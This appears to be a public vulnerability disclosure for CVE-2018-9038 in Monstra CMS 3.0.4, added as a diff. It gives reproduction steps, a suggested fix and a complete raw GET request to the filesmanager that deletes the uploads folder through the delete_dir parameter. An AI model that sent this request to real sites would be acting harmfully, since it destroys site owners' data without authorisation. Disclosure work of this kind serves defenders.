@@ -1,0 +1,44 @@
+# Exploit Title: Monstra CMS 3.0.4 allows remote attackers to delete folder via an get request
+# Date: 2018-03-26
+# Exploit Author: Wenming Jiang
+# Vendor Homepage: https://github.com/monstra-cms/monstra
+# Software Link: https://github.com/monstra-cms/monstra
+# Version: 3.0.4
+# Tested on: macos 10.12.6, php 5.6, apache2.2.29
+# CVE :CVE-2018-9038
+
+
+Description:
+Monstra CMS 3.0.4 allows remote attackers to delete folder via an admin/index.php?id=filesmanager&delete_dir=./&path=uploads/ request.
+
+
+Steps to Reproduce:
+1、Log in as a user with page editing permissions
+2、Request http://your_site/admin/index.php?id=filesmanager&delete_dir=./&path=uploads
+3、The uploads folder will be deleted.
+
+
+Poc code:
+GET /monstra/admin/index.php?id=filesmanager&delete_dir=./&path=uploads/&token=008708df48237172f6fe2d173dc30529eac132de HTTP/1.1
+Host: localhost:8000
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.10 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Referer: http://localhost:8000/monstra/admin/index.php?id=filesmanager&path=uploads/
+Accept-Language: zh,zh-CN;q=0.9,en;q=0.8,zh-TW;q=0.7
+Cookie: SQLiteManager_currentLangue=2; PHPSESSID=882dd1e203c979cedba4524f8107eca3; _ga=GA1.1.1742657188.1524382699; _gid=GA1.1.918663288.1524382699
+Connection: close
+
+
+
+Vulnerability Type:
+Insecure Permissions
+
+
+Expected Behavior:
+deleted uploads folder
+
+
+
+Possible Solutions:
+Strictly filter the delete_dir parameter and replace './' with '_/'
